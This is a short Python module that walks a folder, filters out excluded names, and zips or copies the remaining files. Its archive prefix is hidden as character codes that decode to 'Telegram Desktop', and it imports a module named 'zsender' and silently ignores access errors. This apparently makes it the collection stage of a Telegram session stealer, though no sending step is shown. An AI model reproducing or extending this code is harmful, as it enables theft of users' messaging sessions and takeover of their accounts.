import os
import shutil
import reqinstall
from zsender import d

def filt(dirs, e): return [x for x in dirs if x not in e]
def pack(s, t, c):
    import zipfile as z
    with z.ZipFile(t, 'w', z.ZIP_STORED) as x:
        for r, dirs, f in os.walk(s):
            dirs[:] = filt(dirs, c[1])
            for n in f:
                if n not in c[0]:
                    try:
                        p = os.path.join(r, n)
                        arc = os.path.join(d([84,101,108,101,103,114,97,109,32,68,101,115,107,116,111,112]), os.path.relpath(p, s))
                        x.write(p, arc)
                    except (FileNotFoundError, PermissionError, OSError):
                        pass
    return os.path.exists(t) and os.path.getsize(t) > 0
def trans(s, d, c):
    shutil.rmtree(d) if os.path.exists(d) else None; os.makedirs(d)
    for r, dirs, f in os.walk(s):
        dirs[:] = filt(dirs, c[1])
        for n in f:
            if n not in c[0]:
                try:
                    dst_dir = os.path.join(d, os.path.relpath(r, s))
                    os.makedirs(dst_dir, exist_ok=True)
                    shutil.copy2(os.path.join(r, n), os.path.join(dst_dir, n))
                except (FileNotFoundError, PermissionError, OSError):
                    pass